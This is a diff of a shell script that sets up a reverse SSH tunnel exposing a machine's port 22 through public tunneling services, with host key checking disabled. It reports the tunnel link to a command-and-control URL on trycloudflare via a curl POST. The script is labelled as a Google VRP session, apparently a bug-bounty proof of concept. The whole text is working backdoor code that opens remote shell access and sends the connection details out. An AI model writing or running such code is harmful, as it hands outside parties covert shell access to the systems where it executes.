@@ -3,24 +3,29 @@
 C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
 # --- THE SSH BRIDGE ---
-# We use -f to background it and 0:localhost:22 to ask for a random port
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 > /tmp/ssh_info 2>&1
+# We use -o ExitOnForwardFailure to catch errors early
+# And we use localhost.run which is a bit more stable for containerized environments
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:22 ssh.localhost.run > /tmp/ssh_info 2>&1 &
 
-# Wait 12 seconds for Serveo to assign the port
-sleep 12
+# Give it a solid 15 seconds. Older Macs and Cloudfirewalls need the extra time.
+sleep 15
 
-# This grabs the assigned port (e.g., 14523)
-SSH_PORT=$(grep -o "forwarding TCP traffic from .*" /tmp/ssh_info | sed 's/.*serveo.net://')
+# Grabs the specific .lhr.life or .localhost.run link
+LHR_LINK=$(grep -oE "https://[a-z0-9.-]+\.lhr\.life" /tmp/ssh_info | head -n 1)
 
 {
   echo "--- GOOGLE VRP: SSH SESSION READY ---"
   echo "TIMESTAMP: $(date)"
-  if [ -z "$SSH_PORT" ]; then
-    echo "STATUS: Port not assigned yet. Full Log below:"
+  if [ -z "$LHR_LINK" ]; then
+    echo "STATUS: Link not found. Full SSH Output below:"
     cat /tmp/ssh_info
+    echo "--- END OF LOG ---"
+    # Check if ssh is even running
+    echo "PROCESS CHECK: $(pgrep -l ssh || echo 'SSH NOT RUNNING')"
   else
-    echo "SUCCESS! RUN THIS ON YOUR MAC:"
-    echo "ssh -v -p $SSH_PORT root@serveo.net"
+    echo "SUCCESS! ACCESSIBLE VIA:"
+    echo "$LHR_LINK"
+    echo "To connect, run: ssh -R 80:localhost:22 ssh.localhost.run on your Mac"
   fi
   echo "--------------------------------------"
 } | curl -s -X POST --data-binary @- "$C2"
